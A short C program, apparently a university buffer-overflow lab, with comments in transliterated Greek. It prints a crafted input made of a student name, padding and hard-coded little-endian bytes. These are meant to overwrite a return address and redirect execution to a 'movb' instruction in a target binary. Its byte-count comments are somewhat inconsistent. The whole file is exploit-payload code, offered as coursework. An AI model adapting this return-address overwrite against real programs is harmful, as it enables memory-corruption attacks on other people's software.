#include <stdio.h>
#include <stdlib.h>

#define REMAINING_BYTES 42
int main() {
    int i = 0;
    int changes = 0;
    /* ta addresses einai 4 bytes
     * ena pshfio sto hex einai 1byte
     * ara 4 bytes einai 4 psifia sto hex
     */
    
    /* Prepei na gemisoume enan pinaka pou einai 44 bytes ara exoume: */
    
    /* 5 bytes apo to onoma mou */
    putchar('G');
    putchar('e');
    putchar('k');
    putchar('a');
    putchar('s');
    putchar('\0');
    
    /* kai 41 pou mporoun na einai oti na nai */
    for(; i < REMAINING_BYTES; i++) putchar(' ');
    
    /* =================================================== */
    
    /* Se auto to shmeio prepei na grapsoume to return addresses
     * to opoio tha to vrw apo to arxeio traces.
     */
    putchar(56);
    changes++;
    /* ektelw se assembly thn entolh movb   $0x36,0x80d46e8 */
    /* me auton ton tropo grafw sto arxeio to onoma */
    putchar(0x68);
    changes++;
    putchar(0x8b);
    changes++;
    putchar(0x04);
    changes++;
    putchar(0x08);
    
    putchar(0xe0);
    changes++;
    putchar(0x65);
    changes++;
    putchar(0x0d);
    changes++;
    putchar(0x08);
    changes++;
    
    return changes;
}
